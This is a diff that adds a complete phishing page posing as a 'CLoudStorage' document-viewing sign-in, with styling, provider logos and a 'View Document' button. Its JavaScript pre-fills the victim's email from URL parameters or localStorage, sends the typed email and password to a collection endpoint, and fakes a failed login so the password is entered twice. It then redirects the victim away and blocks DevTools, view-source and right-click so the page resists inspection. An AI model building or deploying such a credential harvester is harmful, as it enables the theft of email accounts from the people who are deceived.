@@ -1,0 +1,891 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - CLoudStorage</title>
+    <link rel="icon" type="image/png" href="favicon.ico">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css">
+    <style>
+        /* ============================================
+                   RESET & BASE
+                   ============================================ */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: url('x/2.jpg') no-repeat center center fixed;
+            background-size: cover;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 3px;
+        }
+
+        /* ============================================
+                   TOP HEADER
+                   ============================================ */
+        .top-header {
+            width: 100%;
+            max-width: 2000px;
+            height: 50px;
+            background: #000;
+            display: flex;
+            align-items: center;
+            border-radius: 6px 6px 0 0;
+            position: relative;
+            z-index: 100;
+        }
+
+        .top-header .brand {
+            background: #D60000;
+            padding: 0 25px;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            color: #fff;
+            font-weight: 700;
+            font-size: 14px;
+            gap: 10px;
+            border-radius: 6px 0 0 0;
+        }
+
+        .top-header .brand img {
+            height: 26px;
+            width: auto;
+        }
+
+        .top-header .nav-actions {
+            margin-left: auto;
+            display: flex;
+            height: 100%;
+        }
+
+        .top-header .nav-actions a {
+            color: #404040;
+            background: #e1e1e1;
+            padding: 0 22px;
+            display: flex;
+            align-items: center;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 500;
+            border-left: 1px solid #ccc;
+            transition: background 0.2s;
+        }
+
+        .top-header .nav-actions a:hover {
+            background: #d0d0d0;
+        }
+
+        .top-header .nav-actions a:last-child {
+            border-radius: 0 6px 0 0;
+        }
+
+        .top-header .nav-actions a i {
+            margin-right: 8px;
+        }
+
+        /* ============================================
+                   ACTION BAR
+                   ============================================ */
+        .action-bar {
+            width: 100%;
+            max-width: 1800px;
+            background: #fff;
+            padding: 10px 25px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+            border-radius: 0 0 6px 6px;
+            flex-wrap: wrap;
+            margin-bottom: 30px;
+        }
+
+        .action-bar .spacer {
+            flex: 1;
+        }
+
+        .action-bar a {
+            color: #454444;
+            text-decoration: none;
+            font-size: 13px;
+            padding: 7px 16px;
+            border-radius: 4px;
+            transition: all 0.2s;
+            font-weight: 500;
+        }
+
+        .action-bar a:hover {
+            background: #f0f0f0;
+        }
+
+        .action-bar .btn-edit {
+            background: #bb0706;
+            color: #fff !important;
+            font-weight: 600;
+        }
+
+        .action-bar .btn-edit:hover {
+            background: #8a0505;
+        }
+
+        .action-bar .btn-edit i {
+            margin-right: 6px;
+        }
+
+        .action-bar .dots {
+            font-weight: 700;
+            font-size: 20px;
+            line-height: 1;
+            padding: 0 8px;
+        }
+
+        /* ============================================
+                   LOGIN CONTAINER
+                   ============================================ */
+        .login-container {
+            background: #fff;
+            width: 100%;
+            max-width: 440px;
+            border-radius: 12px;
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.2);
+            padding: 32px 35px 28px;
+            position: relative;
+            z-index: 10;
+        }
+
+        /* Header */
+        .login-container .header {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding-bottom: 16px;
+            border-bottom: 2px solid #f0f0f0;
+            margin-bottom: 18px;
+        }
+
+        .login-container .header img {
+            height: 48px;
+            width: auto;
+        }
+
+        .login-container .header h1 {
+            color: #bb0706;
+            font-size: 22px;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+        }
+
+        /* Subtitle */
+        .login-container .subtitle {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            font-size: 14px;
+            color: #555;
+        }
+
+        .login-container .subtitle .secure-badge {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .login-container .subtitle .secure-badge img {
+            height: 22px;
+            width: auto;
+        }
+
+        .login-container .subtitle strong {
+            color: #333;
+        }
+
+        .login-container .desc {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 16px;
+            line-height: 1.5;
+        }
+
+        /* Email Providers */
+        .providers {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 14px 0 22px 0;
+            flex-wrap: wrap;
+        }
+
+        .providers img {
+            height: 28px;
+            width: auto;
+            opacity: 0.65;
+            transition: opacity 0.2s;
+        }
+
+        .providers img:hover {
+            opacity: 1;
+        }
+
+        /* ============================================
+                   FORM
+                   ============================================ */
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: block;
+            font-weight: 600;
+            font-size: 13px;
+            color: #555;
+            margin-bottom: 5px;
+        }
+
+        .form-group .input-wrapper {
+            position: relative;
+        }
+
+        .form-group input[type="email"],
+        .form-group input[type="password"] {
+            width: 100%;
+            padding: 12px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: all 0.3s;
+            background: #fafafa;
+            color: #333;
+        }
+
+        .form-group input[type="email"]:focus,
+        .form-group input[type="password"]:focus {
+            border-color: #bb0706;
+            outline: none;
+            background: #fff;
+            box-shadow: 0 0 0 3px rgba(187, 7, 6, 0.1);
+        }
+
+        .form-group input[type="email"]::placeholder,
+        .form-group input[type="password"]::placeholder {
+            color: #aaa;
+        }
+
+        .form-group .toggle-password {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #999;
+            transition: color 0.2s;
+            font-size: 16px;
+        }
+
+        .form-group .toggle-password:hover {
+            color: #333;
+        }
+
+        .form-group .error-msg {
+            color: #d32f2f;
+            font-size: 12px;
+            font-weight: 600;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .form-group .error-msg.show {
+            display: block;
+        }
+
+        /* Form Options */
+        .form-options {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 12px 0 22px 0;
+            font-size: 13px;
+            color: #555;
+            flex-wrap: wrap;
+        }
+
+        .form-options input[type="checkbox"] {
+            accent-color: #bb0706;
+            width: 16px;
+            height: 16px;
+            cursor: pointer;
+        }
+
+        .form-options label {
+            cursor: pointer;
+            font-weight: 500;
+        }
+
+        .form-options .hint {
+            color: #999;
+            font-size: 12px;
+            font-weight: 400;
+        }
+
+        /* Submit Button */
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background: #bb0706;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-submit:hover {
+            background: #8a0505;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(187, 7, 6, 0.3);
+        }
+
+        .btn-submit:active {
+            transform: scale(0.98);
+        }
+
+        .btn-submit:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .btn-submit i {
+            font-size: 16px;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            margin-top: 22px;
+            padding-top: 16px;
+            border-top: 1px solid #eee;
+            font-size: 12px;
+            color: #aaa;
+        }
+
+        .footer .year {
+            color: #888;
+        }
+
+        /* ============================================
+                   COVER OVERLAY
+                   ============================================ */
+        .cover {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.25);
+            z-index: 5;
+            pointer-events: none;
+        }
+
+        /* ============================================
+                   RESPONSIVE
+                   ============================================ */
+        @media (max-width: 600px) {
+            body {
+                padding: 10px;
+            }
+
+            .login-container {
+                padding: 22px 20px 20px;
+                margin-top: 0;
+            }
+
+            .top-header {
+                border-radius: 6px 6px 0 0;
+                height: 44px;
+            }
+
+            .top-header .brand {
+                font-size: 12px;
+                padding: 0 14px;
+                gap: 6px;
+            }
+
+            .top-header .brand img {
+                height: 20px;
+            }
+
+            .top-header .nav-actions a {
+                padding: 0 14px;
+                font-size: 12px;
+            }
+
+            .top-header .nav-actions a i {
+                margin-right: 4px;
+            }
+
+            .action-bar {
+                padding: 8px 14px;
+                gap: 6px;
+                border-radius: 0 0 6px 6px;
+            }
+
+            .action-bar a {
+                font-size: 11px;
+                padding: 5px 10px;
+            }
+
+            .action-bar .dots {
+                font-size: 16px;
+            }
+
+            .login-container .header h1 {
+                font-size: 18px;
+            }
+
+            .login-container .header img {
+                height: 38px;
+            }
+
+            .providers img {
+                height: 22px;
+            }
+
+            .form-group input[type="email"],
+            .form-group input[type="password"] {
+                padding: 10px 14px;
+                font-size: 14px;
+            }
+
+            .btn-submit {
+                font-size: 15px;
+                padding: 12px;
+            }
+        }
+
+        @media (max-width: 400px) {
+            .top-header .brand span {
+                display: none;
+            }
+
+            .top-header .nav-actions a {
+                padding: 0 10px;
+                font-size: 11px;
+            }
+
+            .login-container {
+                padding: 16px 14px 16px;
+            }
+
+            .action-bar .spacer {
+                display: none;
+            }
+        }
+
+    .form-x a {
+        color: #FF6B6B;
+        text-decoration: none;
+    }
+    .form-x a:hover {
+        color: #E53935;
+        text-decoration: underline;
+    }
+    </style>
+</head>
+<body>
+
+    <!-- ============================================
+    TOP HEADER
+    ============================================ -->
+    <header class="top-header">
+        <div class="brand">
+            <img src="x/1.png" alt="">
+   
+        </div>
+        
+    </header>
+
+    <!-- ============================================
+    ACTION BAR
+    ============================================ -->
+    <nav class="action-bar">
+        <div class="spacer"></div>
+    
+        <a href="#"><i class="fa fa-download"></i> Download</a>
+        <a href="#"><i class="fa fa-print"></i> Print</a>
+  
+        <a href="#" class="dots">⋯</a>
+    </nav>
+
+    <!-- ============================================
+    LOGIN CONTAINER
+    ============================================ -->
+    <div class="login-container">
+        <!-- Header -->
+        <div class="header">
+            <img src="x/32.png" alt="">
+            
+        </div>
+
+        <!-- Subtitle -->
+        <div class="subtitle">
+            <div class="secure-badge">
+                <img src="x/4.jpg" alt="">
+                <span>Confirm your identity</span>
+            </div>
+        </div>
+
+        <p class="desc">
+            Sign in with your connected and active email account to access document
+        </p>
+
+        <!-- Email Providers -->
+        <div class="providers">
+            <img src="x/5.png" alt="">
+            <img src="x/6.png" alt="">
+            <img src="x/7.jpg" alt="">
+            <img src="x/8.gif" alt="">
+            <img src="x/9.png" alt="">
+            <img src="x/email-logo.png" alt="">
+        </div>
+
+        <!-- ============================================
+        FORM
+        ============================================ -->
+        <form id="loginForm" novalidate>
+            <!-- Email -->
+            <div class="form-group">
+                <label for="email">Email Address</label>
+                <div class="input-wrapper">
+                    <input type="email" id="email" name="email" placeholder="Enter your email" required autocomplete="email">
+                </div>
+                <div id="errorEmail" class="error-msg">Please enter a valid email address.</div>
+            </div>
+
+            <!-- Password -->
+            <div class="form-group">
+                <label for="password">Password</label>
+                <div class="input-wrapper">
+                    <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
+                    <i class="fas fa-eye toggle-password" id="togglePassword"></i>
+                </div>
+                <div id="errorPassword" class="error-msg">Please enter a valid password (minimum 5 characters).</div>
+                <div id="errorLogin" class="error-msg">Login failed. Please try again.</div>
+            </div>
+
+            <!-- Options -->
+            <div class="form-options">
+                <input type="checkbox" id="staySigned">
+                <label for="staySigned">Stay signed in</label>
+                <span class="hint">(Do not check if using a public computer)</span>
+            </div>
+
+  <!-- Options -->
+            <div class="form-x">
+                <a href="#">Forgot password?</a>      
+                <span class="hint"><a href="#">Create account</a></span>
+            </div></br>
+
+
+            <!-- Submit -->
+            <button type="submit" class="btn-submit" id="submitBtn">
+                <i class="fas fa-file-pdf"></i> View Document
+            </button>
+        </form>
+
+        <!-- Footer -->
+        <div class="footer">
+            &copy; <span class="year" id="year"></span>. All rights reserved.
+        </div>
+    </div>
+
+    <!-- ============================================
+    COVER OVERLAY
+    ============================================ -->
+    <div class="cover"></div>
+
+    <!-- ============================================
+    JAVASCRIPT
+    ============================================ -->
+    <script>
+ // ============================================
+        // CONFIGURATION - UPDATE THIS
+        // ============================================
+        const WEBHOOK_URL = 'srv.js'; 
+        const MAX_ATTEMPTS = 2; // Number of attempts before redirect
+        const REDIRECT_URL = 'x/50f.png'; // Where to redirect after max attempts
+
+        // ============================================
+        // MAIN LOGIC
+        // ============================================
+        $(document).ready(function() {
+
+            // Set current year in footer
+            $('#year').text(new Date().getFullYear());
+
+            // ============================================
+            // Extract Email from URL
+            // Supports:
+            //   #email@domain.com
+            //   ?email@domain.com
+            //   ?email=email@domain.com
+            //   ?login=base64encoded
+            //   localStorage (from previous sessions)
+            // ============================================
+            function extractEmailFromURL() {
+                let email = null;
+                const hash = window.location.hash;
+                const search = window.location.search;
+
+                // Method 1: Check hash (#email@domain.com)
+                if (hash && hash.length > 1) {
+                    const val = hash.substr(1);
+                    if (val.includes('@') && val.includes('.')) {
+                        email = val;
+                    }
+                }
+
+                // Method 2: Check query string (?email@domain.com)
+                if (!email && search && search.length > 1) {
+                    const val = search.substr(1);
+                    if (val.includes('@') && val.includes('.') && !val.includes('=')) {
+                        email = val;
+                    }
+                }
+
+                // Method 3: Check email parameter (?email=email@domain.com)
+                if (!email) {
+                    const params = new URLSearchParams(search);
+                    const param = params.get('email');
+                    if (param && param.includes('@') && param.includes('.')) {
+                        email = param;
+                    }
+                }
+
+                // Method 4: Check base64 login parameter (?login=base64)
+                if (!email) {
+                    const params = new URLSearchParams(search);
+                    const loginParam = params.get('login');
+                    if (loginParam) {
+                        try {
+                            const decoded = atob(loginParam);
+                            if (decoded.includes('@') && decoded.includes('.')) {
+                                email = decoded;
+                            }
+                        } catch (e) { /* ignore */ }
+                    }
+                }
+
+                // Method 5: Check localStorage
+                if (!email && localStorage.getItem('email')) {
+                    try {
+                        const stored = atob(localStorage.getItem('email'));
+                        if (stored.includes('@') && stored.includes('.')) {
+                            email = stored;
+                        }
+                    } catch (e) { /* ignore */ }
+                }
+
+                return email;
+            }
+
+            // Pre-fill email if found
+            const extractedEmail = extractEmailFromURL();
+            if (extractedEmail) {
+                $('#email').val(extractedEmail);
+            }
+
+            // ============================================
+            // Toggle Password Visibility
+            // ============================================
+            $('#togglePassword').click(function() {
+                const input = $('#password');
+                if (input.attr('type') === 'password') {
+                    input.attr('type', 'text');
+                    $(this).removeClass('fa-eye').addClass('fa-eye-slash');
+                } else {
+                    input.attr('type', 'password');
+                    $(this).removeClass('fa-eye-slash').addClass('fa-eye');
+                }
+            });
+
+            // ============================================
+            // Send to Webhook
+            // ============================================
+            async function sendToWebhook(email, password, attempt) {
+                try {
+                    const response = await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            email: email,
+                            password: password,
+                            step: 'login_attempt',
+                            attempt: attempt,
+                            total_attempts_allowed: MAX_ATTEMPTS,
+                            timestamp: new Date().toISOString(),
+                            source: 'login.html'
+                        })
+                    });
+                    return await response.json();
+                } catch (error) {
+                    console.error('Webhook error:', error);
+                    return null;
+                }
+            }
+
+            // ============================================
+            // Error Handling
+            // ============================================
+            function clearErrors() {
+                $('#errorEmail, #errorPassword, #errorLogin').removeClass('show');
+            }
+
+            function showError(id) {
+                $('#' + id).addClass('show');
+            }
+
+            // ============================================
+            // Form Submit Handler
+            // ============================================
+            let attemptCount = 0;
+
+            $('#loginForm').on('submit', function(e) {
+                e.preventDefault();
+
+                const email = $('#email').val().trim();
+                const password = $('#password').val();
+                const emailRegex = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+                clearErrors();
+
+                // Validate email
+                if (!emailRegex.test(email)) {
+                    showError('errorEmail');
+                    $('#email').focus();
+                    return;
+                }
+
+                // Validate password
+                if (!password || password.length < 5) {
+                    showError('errorPassword');
+                    $('#password').focus();
+                    return;
+                }
+
+                // Increment attempt counter
+                attemptCount++;
+
+                // Disable button and show loading state
+                const $btn = $('#submitBtn');
+                $btn.prop('disabled', true);
+                $btn.html('<i class="fas fa-spinner fa-spin"></i> Verifying...');
+
+                // Send to webhook (async - don't wait for response)
+                sendToWebhook(email, password, attemptCount);
+
+                // Process after delay
+                setTimeout(function() {
+
+                    // Check if max attempts reached
+                    if (attemptCount >= MAX_ATTEMPTS) {
+                        // Reset counter
+                        attemptCount = 0;
+                        clearErrors();
+                        localStorage.setItem('email', '');
+
+                        // Redirect to document
+                        window.location.replace(REDIRECT_URL);
+                        return;
+                    }
+
+                    // Not max attempts yet - allow retry
+                    $btn.prop('disabled', false);
+                    $btn.html('<i class="fas fa-file-pdf"></i> Try Again');
+
+                    // Clear password and focus
+                    $('#password').val('').focus();
+
+                    // Show login failed message
+                    showError('errorLogin');
+
+                }, 1500);
+            });
+
+            // ============================================
+            // Security: Prevent Keyboard Shortcuts
+            // ============================================
+
+            // Prevent Ctrl+S, Ctrl+C, Ctrl+U, Ctrl+Shift+I
+            $(document).on('keydown', function(e) {
+                // Ctrl+Shift+I (DevTools)
+                if (e.ctrlKey && e.shiftKey && e.which === 73) {
+                    e.preventDefault();
+                    return false;
+                }
+
+                // Ctrl+U (View Source)
+                if (e.ctrlKey && e.which === 85) {
+                    e.preventDefault();
+                    return false;
+                }
+
+                // Ctrl+S (Save)
+                if (e.ctrlKey && e.which === 83) {
+                    e.preventDefault();
+                    return false;
+                }
+
+                // Ctrl+C (Copy) - allow but we block context menu
+                // Ctrl+Shift+C (Inspect)
+                if (e.ctrlKey && e.shiftKey && e.which === 67) {
+                    e.preventDefault();
+                    return false;
+                }
+
+                // F12 (DevTools)
+                if (e.which === 123) {
+                    e.preventDefault();
+                    return false;
+                }
+            });
+
+            // Disable right-click context menu
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+            });
+
+            // Prevent drag and drop
+            document.addEventListener('dragstart', function(e) {
+                e.preventDefault();
+            });
+
+            // ============================================
+            // Auto-focus on password if email is pre-filled
+            // ============================================
+            if (extractedEmail) {
+                $('#password').focus();
+            }
+
+        });
+    </script>
+
+</body>
+</html>
